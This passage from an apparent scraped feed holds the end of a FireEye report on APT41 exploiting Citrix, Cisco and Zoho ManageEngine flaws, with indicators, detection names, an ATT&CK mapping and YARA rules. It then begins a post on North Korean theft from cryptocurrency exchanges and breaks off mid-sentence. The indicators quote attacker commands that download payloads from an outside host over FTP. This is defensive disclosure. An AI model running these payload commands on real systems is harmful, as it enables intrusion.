\n<p>ManageEngine released a short term <a href=\"https://www.manageengine.com/products/desktop-central/remote-code-execution-vulnerability.html\">mitigation</a> for CVE-2020-10189 on January 20, 2020, and subsequently released an <a href=\"https://www.manageengine.com/products/desktop-central/rce-vulnerability-cve-2020-10189.html?utm_source=rce-kb\">update</a> on March 7, 2020, with a long term fix.</p> \n<h4>Outlook</h4> \n<p>This activity is one of the most widespread campaigns we have seen from China-nexus espionage actors in recent years. While APT41 has previously conducted activity with an extensive initial entry such as the trojanizing of NetSarang software, this scanning and exploitation <u>has focused on a subset of our customers</u>, and seems to reveal a high operational tempo and wide collection requirements for APT41.</p> \n<p>It is notable that we have only seen these exploitation attempts leverage publicly available malware such as Cobalt Strike and Meterpreter. While these backdoors are full featured, in previous incidents APT41 has waited to deploy more advanced malware until they have fully understood where they were and carried out some initial reconnaissance. In 2020, APT41 continues to be one of the most prolific threats that FireEye currently tracks. This new activity from this group shows how resourceful and how quickly they can leverage newly disclosed vulnerabilities to their advantage.</p> \n<p>Previously, <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/managed-detection-and-response.html\">FireEye Mandiant Managed Defense</a> identified APT41 successfully leverage CVE-2019-3396 (Atlassian Confluence) against a U.S. based university. While APT41 is a <a href=\"https://content.fireeye.com/apt-41/rpt-apt41/\">unique</a> state-sponsored Chinese threat group that conducts espionage, the actor also conducts financially motivated activity for personal gain.</p> \n<h4>Indicators</h4> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Type</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Indicator(s)</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>CVE-2019-19781 Exploitation (Citrix Application Delivery Control)</p> </td> \n   <td width=\"312\" valign=\"top\"><p>66.42.98[.]220</p> <p>CVE-2019-19781 exploitation attempts with a payload of ‘file /bin/pwd’</p> <p>CVE-2019-19781 exploitation attempts with a payload of ‘/usr/bin/ftp -o /tmp/un ftp://test:[redacted]\\@66.42.98[.]220/bsd’</p> <p>CVE-2019-19781 exploitation attempts with a payload of ‘/usr/bin/ftp -o /tmp/un ftp://test:[redacted]\\@66.42.98[.]220/un’</p> <p>/tmp/bsd</p> <p>/tmp/un</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Cisco Router Exploitation</p> </td> \n   <td width=\"312\" valign=\"top\"><p>66.42.98\\.220</p> <p>‘1.txt’ (MD5: &nbsp;c0c467c8e9b2046d7053642cc9bdd57d)</p> <p>‘fuc’ (MD5: 155e98e5ca8d662fad7dc84187340cbc</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>CVE-2020-10189 (Zoho ManageEngine Desktop Central)</p> </td> \n   <td width=\"312\" valign=\"top\"><p>66.42.98[.]220</p> <p>91.208.184[.]78</p> <p>74.82.201[.]8</p> <p>exchange.dumb1[.]com</p> <p>install.bat (MD5: 7966c2c546b71e800397a67f942858d0)</p> <p>storesyncsvc.dll (MD5: 5909983db4d9023e4098e56361c96a6f)</p> <p>C:\\Windows\\Temp\\storesyncsvc.dll</p> <p>C:\\Windows\\Temp\\install.bat</p> <p>2.exe (MD5: 3e856162c36b532925c8226b4ed3481c)</p> <p>C:\\Users\\[redacted]\\install.bat</p> <p>TzGG (MD5: 659bd19b562059f3f0cc978e15624fd9)</p> <p>C:\\ManageEngine\\DesktopCentral_Server\\jre\\bin\\java.exe spawning cmd.exe and/or bitsadmin.exe</p> <p>Certutil.exe downloading 2.exe and/or payloads from 91.208.184[.]78</p> <p>PowerShell downloading files with Net.WebClient</p> </td> \n  </tr>\n </tbody>\n</table> \n<h4>Detecting the Techniques</h4> \n<p>FireEye detects this activity across our platforms. This table contains several specific detection names from a larger list of detections that were available prior to this activity occurring.</p> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Platform</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Signature Name</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Endpoint Security</p> <p>&nbsp;</p> </td> \n   <td width=\"312\" valign=\"top\"><p>BITSADMIN.EXE MULTISTAGE DOWNLOADER (METHODOLOGY)</p> <p>CERTUTIL.EXE DOWNLOADER A (UTILITY)</p> <p>Generic.mg.5909983db4d9023e</p> <p>Generic.mg.3e856162c36b5329</p> <p>POWERSHELL DOWNLOADER (METHODOLOGY)</p> <p>SUSPICIOUS BITSADMIN USAGE B (METHODOLOGY)</p> <p>SAMWELL (BACKDOOR)</p> <p>SUSPICIOUS CODE EXECUTION FROM ZOHO MANAGE ENGINE (EXPLOIT)</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Network Security</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Backdoor.Meterpreter</p> <p>DTI.Callback</p> <p>Exploit.CitrixNetScaler</p> <p>Trojan.METASTAGE</p> <p>Exploit.ZohoManageEngine.CVE-2020-10198.Pwner</p> <p>Exploit.ZohoManageEngine.CVE-2020-10198.mdmLogUploader</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Helix</p> </td> \n   <td width=\"312\" valign=\"top\"><p>CITRIX ADC [Suspicious Commands]<br /> &nbsp;EXPLOIT - CITRIX ADC [CVE-2019-19781 Exploit Attempt]<br /> &nbsp;EXPLOIT - CITRIX ADC [CVE-2019-19781 Exploit Success]<br /> &nbsp;EXPLOIT - CITRIX ADC [CVE-2019-19781 Payload Access]<br /> &nbsp;EXPLOIT - CITRIX ADC [CVE-2019-19781 Scanning]<br /> &nbsp;MALWARE METHODOLOGY [Certutil User-Agent]<br /> &nbsp;WINDOWS METHODOLOGY [BITSadmin Transfer]<br /> &nbsp;WINDOWS METHODOLOGY [Certutil Downloader]</p> </td> \n  </tr>\n </tbody>\n</table> \n<h4>MITRE ATT&amp;CK Technique Mapping</h4> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>ATT&amp;CK</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Techniques</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Initial Access</p> </td> \n   <td width=\"312\" valign=\"top\"><p>External Remote Services (T1133), Exploit Public-Facing Application (T1190)</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Execution</p> </td> \n   <td width=\"312\" valign=\"top\"><p>PowerShell (T1086), Scripting (T1064)</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Persistence</p> </td> \n   <td width=\"312\" valign=\"top\"><p>New Service (T1050)</p> <p>&nbsp;</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Privilege Escalation</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Exploitation for Privilege Escalation (T1068)</p> <p>&nbsp;</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Defense Evasion</p> </td> \n   <td width=\"312\" valign=\"top\"><p>BITS Jobs (T1197), Process Injection (T1055)</p> <p>&nbsp;</p> <p>&nbsp;</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Command And Control</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Remote File Copy (T1105), Commonly Used Port (T1436), Uncommonly Used Port (T1065), Custom Command and Control Protocol (T1094), Data Encoding (T1132), Standard Application Layer Protocol (T1071)</p> </td> \n  </tr>\n </tbody>\n</table> \n<h4>Appendix A: Discovery Rules</h4> \n<p>The following Yara rules serve as examples of discovery rules for APT41 actor TTPs, turning the adversary methods or tradecraft into new haystacks for purposes of detection or hunting. For all tradecraft-based discovery rules, we recommend deliberate testing and tuning prior to implementation in any production system. Some of these rules are tailored to build concise haystacks that are easy to review for high-fidelity detections. Some of these rules are broad in aperture that build larger haystacks for further automation or processing in threat hunting systems.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><p>import \"pe\"</p> <p>rule ExportEngine_APT41_Loader_String</p> <p>{</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; meta:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; author = \"@stvemillertime\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; description \"This looks for a common APT41 Export DLL name in BEACON shellcode loaders, such as loader_X86_svchost.dll\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strings:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pcre = /loader_[\\x00-\\x7F]{1,}\\x00/</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; condition:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address) + 12))</p> <p>}</p> <p>rule ExportEngine_ShortName</p> <p>{</p> <p>&nbsp;&nbsp;&nbsp; meta:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; author = \"@stvemillertime\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; description = \"This looks for Win PEs where Export DLL name is a single character\"</p> <p>&nbsp;&nbsp;&nbsp; strings:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pcre = /[A-Za-z0-9]{1}\\.(dll|exe|dat|bin|sys)/</p> <p>&nbsp;&nbsp;&nbsp; condition:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address) + 12))</p> <p>}</p> <p>rule ExportEngine_xArch</p> <p>{</p> <p>&nbsp;&nbsp;&nbsp; meta:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; author = \"@stvemillertime\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; description = \"This looks for Win PEs where Export DLL name is a something like x32.dat\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strings:</p> <p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pcre = /[\\x00-\\x7F]{1,}x(32|64|86)\\.dat\\x00/</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; condition:</p> <p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address) + 12))</p> <p>}</p> <p>rule RareEquities_LibTomCrypt</p> <p>{</p> <p>&nbsp;&nbsp;&nbsp; meta:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; author = \"@stvemillertime\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; description = \"This looks for executables with strings from LibTomCrypt as seen by some APT41-esque actors https://github.com/libtom/libtomcrypt - might catch everything BEACON as well. You may want to exclude Golang and UPX packed samples.\"</p> <p>&nbsp;&nbsp;&nbsp; strings:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $a1 = \"LibTomMath\"</p> <p>&nbsp;&nbsp;&nbsp; condition:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $a1</p> <p>}</p> <p>rule RareEquities_KCP</p> <p>{</p> <p>&nbsp;&nbsp;&nbsp; meta:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; author = \"@stvemillertime\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; description = \"This is a wide catchall rule looking for executables with equities for a transport library called KCP, https://github.com/skywind3000/kcp Matches on this rule may have built-in KCP transport ability.\"</p> <p>&nbsp;&nbsp;&nbsp; strings:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $a01 = \"[RO] %ld bytes\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $a02 = \"recv sn=%lu\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $a03 = \"[RI] %d bytes\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $a04 = \"input ack: sn=%lu rtt=%ld rto=%ld\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $a05 = \"input psh: sn=%lu ts=%lu\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $a06 = \"input probe\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $a07 = \"input wins: %lu\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $a08 = \"rcv_nxt=%lu\\\\n\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $a09 = \"snd(buf=%d, queue=%d)\\\\n\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $a10 = \"rcv(buf=%d, queue=%d)\\\\n\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $a11 = \"rcvbuf\"</p> <p>&nbsp;&nbsp;&nbsp; condition:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and filesize &lt; 5MB and 3 of ($a*)</p> <p>}</p> <p>rule ConventionEngine_Term_Users</p> <p>{</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; meta:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; author = \"@stvemillertime\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; description = \"Searching for PE files with PDB path keywords, terms or anomalies.\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sample_md5 = \"09e4e6fa85b802c46bc121fcaecc5666\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ref_blog = \"https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strings:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pcre = /RSDS[\\x00-\\xFF]{20}[a-zA-Z]:\\\\[\\x00-\\xFF]{0,200}Users[\\x00-\\xFF]{0,200}\\.pdb\\x00/ nocase ascii</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; condition:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre</p> <p>}</p> <p>rule ConventionEngine_Term_Desktop</p> <p>{</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; meta:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; author = \"@stvemillertime\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; description = \"Searching for PE files with PDB path keywords, terms or anomalies.\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sample_md5 = \"71cdba3859ca8bd03c1e996a790c04f9\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ref_blog = \"https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strings:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pcre = /RSDS[\\x00-\\xFF]{20}[a-zA-Z]:\\\\[\\x00-\\xFF]{0,200}Desktop[\\x00-\\xFF]{0,200}\\.pdb\\x00/ nocase ascii</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; condition:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre</p> <p>}</p> <p>rule ConventionEngine_Anomaly_MultiPDB_Double</p> <p>{</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; meta:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; author = \"@stvemillertime\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; description = \"Searching for PE files with PDB path keywords, terms or anomalies.\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sample_md5 = \"013f3bde3f1022b6cf3f2e541d19353c\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ref_blog = \"https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html\"</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strings:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pcre = /RSDS[\\x00-\\xFF]{20}[a-zA-Z]:\\\\[\\x00-\\xFF]{0,200}\\.pdb\\x00/</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; condition:</p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and #pcre == 2</p> <p>}</p> </td> \n  </tr>\n </tbody>\n</table>","descriptionType":"html","publishedDate":"Wed, 25 Mar 2020 12:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/apt41exploits/apt41-timeline-blog-v2.png","linkMd5":"f06f50adeb8b5e3b89bf9f76386e1194","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn69@2020_6/2020/08/24/14-11-04-960_17443591b4614593.webp","destWidth":2092,"destHeight":503,"sourceBytes":101585,"destBytes":72322,"author":"Christopher Glyer","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/apt41exploits/apt41-timeline-blog-v2.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn69@2020_6/2020/08/24/14-11-04-960_17443591b4614593.webp"},"publishedOrCreatedDate":1598278264192},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Why Is North Korea So Interested in Bitcoin?,Why Is North Korea So\nInterested in Bitcoin?","link":"http://www.fireeye.com/blog/threat-research/2017/09/north-korea-interested-in-bitcoin.html","description":"<p>In 2016 we began observing actors we believe to be North Korean utilizing their intrusion capabilities to conduct cyber crime, targeting banks and the global financial system. This marked a departure from previously observed activity of North Korean actors employing cyber espionage for traditional nation state activities. Yet, given North Korea's position as a pariah nation cut off from much of the global economy – as well as a nation that employs a government bureau to conduct <a href=\"https://www.bloomberg.com/news/articles/2017-08-10/kim-s-secretive-office-39-hit-by-sanctions-on-north-korea-inc\">illicit economic activity</a> – this is not all that surprising. With North Korea's tight control of its military and intelligence capabilities, it is likely that this activity was carried out to fund the state or personal coffers of Pyongyang's elite, as international sanctions have constricted the Hermit Kingdom.</p> \n<p>Now, we may be witnessing a second wave of this campaign: state-sponsored actors seeking to steal bitcoin and other virtual currencies as a means of evading sanctions and obtaining hard currencies to fund the regime. Since May 2017,&nbsp;<a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services.html\" target=\"_self\">Mandiant experts</a> observed North Korean actors target at least three South Korean cryptocurrency exchanges with the suspected intent of stealing funds. The spearphishing we have observed in these cases often targets personal email accounts of employees at digital currency exchanges, frequently using tax-themed lures and deploying malware (<a href=\"https://www.fireeye.com/content/dam/fireeye-www/global/en/blog/threat-research/FireEye_HWP_ZeroDay.pdf\">PEACHPIT</a> and similar variants) linked to North Korean actors suspected to be responsible for intrusions into global banks in 2016.</p> \n<p>Add to that the ties between North Korean operators and a watering hole compromise of a bitcoin news site in 2016, as well as at least one instance of usage of a <a href=\"http://www.csoonline.com/article/3187548/security/kaspersky-lab-reveals-direct-link-between-banking-heist-hackers-and-north-korea.html\">surreptitious cryptocurrency miner</a>, and we begin to see a picture of North Korean interest in cryptocurrencies, an asset class in which bitcoin alone has increased over 400% since the beginning of this year.</p> \n<h4>2017 North Korean Activity Against South Korean Cryptocurrency Targets</h4> \n<ul> \n <li>April 22 – <a href=\"http://www.smh.com.au/federal-politics/political-news/bipartisan-push-for-the-reserve-bank-to-back-australian-bitcoin-20170807-gxqrm7.html\">Four wallets on Yapizon</a>, a South Korean cryptocurrency exchange, are compromised. (It is worth noting that at least some of the tactics, techniques, and procedures were reportedly employed during this compromise were different than those we have observed in following intrusion attempts and as of yet there are no clear indications of North Korean involvement).</li> \n <li>April 26 – The United States announces a strategy of increased economic sanctions against North Korea. Sanctions from the international community could be driving North Korean interest in cryptocurrency, as discussed earlier.</li> \n <li>Early May – Spearphishing against South Korean Exchange #1 begins.</li> \n <li>Late May – South Korean Exchange #2 compromised via spearphish.</li> \n <li>Early June – More suspected North Korean activity targeting unknown victims, believed to be cryptocurrency service providers in South Korea.</li> \n <li>Early July – South Korean Exchange #3 targeted via spear phishing to personal account.</li> \n</ul> \n<h4>Benefits to Targeting Cryptocurrencies</h4> \n<p>While bitcoin and cryptocurrency exchanges may seem like odd targets for nation state actors interested in funding state coffers, some of the other illicit endeavors North Korea pursues further demonstrate interest in conducting financial crime on the regime’s behalf. North Korea's Office 39 is involved in activities such as gold smuggling, counterfeiting foreign currency, and even operating <a href=\"https://www.washingtonpost.com/news/worldviews/wp/2016/04/08/the-weird-world-of-north-koreas-overseas-restaurants/?utm_term=.e6d27b8008bc\">restaurants</a>. Besides a focus on the global banking system and cryptocurrency exchanges, a recent report by a South Korean institute noted involvement by North Korean actors in <a href=\"https://www.wsj.com/articles/north-korean-hackers-hunt-for-cash-1501128326\">targeting ATMs with malware</a>, likely actors at the very least supporting similar ends.</p> \n<p>If actors compromise an exchange itself (as opposed to an individual account or wallet) they potentially can move cryptocurrencies out of online wallets, swapping them for other, more anonymous cryptocurrencies or send them directly to other wallets on different exchanges to withdraw them in fiat currencies such as South Korean won, US dollars, or Chinese renminbi. As the regulatory environment around cryptocurrencies is still emerging, some exchanges in different jurisdictions may have lax anti-money laundering controls easing this process and make the exchanges an attractive tactic for anyone seeking hard currency.</p> \n<h4>Conclusion</h4> \n<p>As bitcoin and other cryptocurrencies have increased in value in the last year, nation states are beginning to take notice. Recently, an advisor to President Putin in Russia announced <a href=\"https://www.coindesk.com/100-million-putin-advisor-targets-big-raise-bitcoin-mining-ico/\">plans to raise funds</a> to increase Russia's share of bitcoin mining, and senators in Australia's parliament have proposed developing their own <a href=\"http://www.smh.com.au/federal-politics/political-news/bipartisan-push-for-the-reserve-bank-to-back-australian-bitcoin-20170807-gxqrm7.html\">national cryptocurrency</a>.</p> \n<p>Consequently, it should be no surprise that cryptocurrencies, as an emerging asset class, are becoming a target of interest by a regime that operates in many ways like a criminal enterprise. While at present North Korea is somewhat distinctive in both their willingness to engage in financial 